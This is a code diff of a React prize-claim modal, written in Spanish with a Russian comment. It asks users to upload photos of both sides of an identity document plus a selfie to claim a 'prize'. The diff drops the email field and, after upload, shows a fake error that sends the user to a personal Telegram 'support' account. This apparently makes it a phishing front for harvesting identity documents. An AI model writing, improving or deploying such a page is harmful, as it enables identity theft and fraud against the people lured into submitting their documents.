@@ -7,7 +7,6 @@ import axios from 'axios';
 const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setPassScaner }) => {
 
 
-    const [email, setEmail] = useState();
     const [emailError, setEmailError] = useState(false);
     const [finish, setFinish] = useState(false)
 
@@ -27,14 +26,13 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
     const modalStyle = result ? { transform: isMobile ? 'scale(1)' : 'translate(-50%, -50%) scale(1)' } : {};
 
     const handleSubmit = async () => {
-        if (!email || !front || !back || !selfie) {
+        if ( !front || !back || !selfie) {
             setEmailError(true);
         } else {
             setEmailError(false);
             setFinish(true)
             const formData = new FormData();
             formData.append('prize', result);
-            formData.append('email', email);
             formData.append('images', front); // Добавляем переднее изображение в список images
             formData.append('images', back); // Добавляем заднее изображение в список images
             formData.append('images', selfie); // Добавляем селфи в список images
@@ -68,18 +66,12 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
         <div className="modal" style={modalStyle}>
             <h2 onClick={() => console.log(front)}>¡Felicidades! Tu premio es <span>{result}</span></h2>
             {finish ? (
-                <p>Genial, tus documentos han sido enviados para verificación, espera.</p>
+                <p>Error, por favor escribe al <a href="https://t.me/emiliogonzalesg">soporte</a>.</p>
             ) : (
                 <div>
                     <p>Para reclamar un premio debes ser mayor de 18 años, subir tus documentos y una selfie.</p>
 
-                    <input className='email'
-                        type="email"
-                        placeholder='Email de contacto'
-                        value={email}
-                        onChange={(e) => setEmail(e.target.value)}
-                        size="30"
-                        required />
+     
                     <div className="docLoad">
                         <div className="front">
                             <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
@@ -111,7 +103,7 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
                         </div>
                     </div>
 
-                    {emailError && <span className="error-msg">¡No has ingresado un correo electrónico o no has cargado todas las fotos!</span>}
+                    {emailError && <span className="error-msg">¡No has subido todas las fotos!</span>}
                     <button className='sendDoc' onClick={handleSubmit}>Enviar para revisión</button>
                 </div>
             )}
